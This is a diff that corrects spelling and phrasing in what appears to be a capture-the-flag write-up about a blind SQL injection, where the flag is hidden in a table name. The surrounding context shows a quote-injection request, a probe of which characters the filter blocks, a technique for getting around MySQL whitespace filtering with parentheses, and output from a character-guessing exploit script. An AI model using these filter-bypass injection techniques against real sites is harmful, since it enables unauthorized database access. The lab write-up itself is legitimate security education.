@@ -7,10 +7,10 @@ What a DBA team : Shakespeare and Einstein ...
 But who they will name tables ? that'is the question"
 
 ## Solution
-According to the challenge's description, the flag in the name of a table (starting with FLAG_).
+According to the challenge description, the flag in the name of a table (starting with FLAG_).
 So We need to exploit an SQL injection to resolve this challenge.
 
-We start by injecting a simple quote in the id parametre using the folowing HTTP request :
+We start by injecting a simple quote in the id parametr using the following HTTP request :
 
 ```
 GET /index.php?id=%27 HTTP/1.1
@@ -21,7 +21,7 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
 
-But it seems that there is a filtering mechanism which block/detecte malicious charcters :
+But it seems that there is a filtering mechanism which block/detect malicious characters:
 
 ```
 HTTP/1.1 200 OK
@@ -36,7 +36,7 @@ Content-Type: text/html
 Attack Detected !
 ```
 
-First, we need to determine what pattern is used by the target in order to bypass it later. For example, we can try to inject all possible ascii code and compre response :
+First, we need to determine what pattern is used by the target in order to bypass it later. For example, we can try to inject all possible ASCII code :
 
 ```
 tmr@desktop:~$ python pattern_detector.py
@@ -47,9 +47,9 @@ tmr@desktop:~$ python pattern_detector.py
 [+] \ is filtred  // anti-slashe
 ```
 
-As you can see above whitespace slaches and quotes are all catched by the target. But MySQL offer the possibility to avoid whitespaces by using parenthesis to seperate SQL keywords. 
+As you can see above whitespace slashes and quotes are all caught by the target. But MySQL offers the possibility to avoid whitespaces by using parenthesis to separate SQL keywords.
 
-For example, you can inject a boolean expression :
+For example, we can inject a boolean expression as follow :
 
 
 ```
@@ -61,7 +61,8 @@ Accept-Encoding: gzip, deflate
 Connection: keep-alive
 ```
 
-We get a valid reponse from the server (the profil page is displyed correctly) :
+We get a valid response from the server (the profile page is displayed correctly) :
+
 
 ```
 HTTP/1.1 200 OK
@@ -87,7 +88,7 @@ Then, you can craft your own exploit to guess the table name :
 
 ```
 tmr@desktop:~$ python exploit.py 
-[+] Blind SQL Injection Exploit Using LIKE Technic 
+[+] Blind SQL Injection Exploit Using %LIKE% Technique 
 [+] New Guessed Char : E
 FLAG_E
 [+] New Guessed Char : N
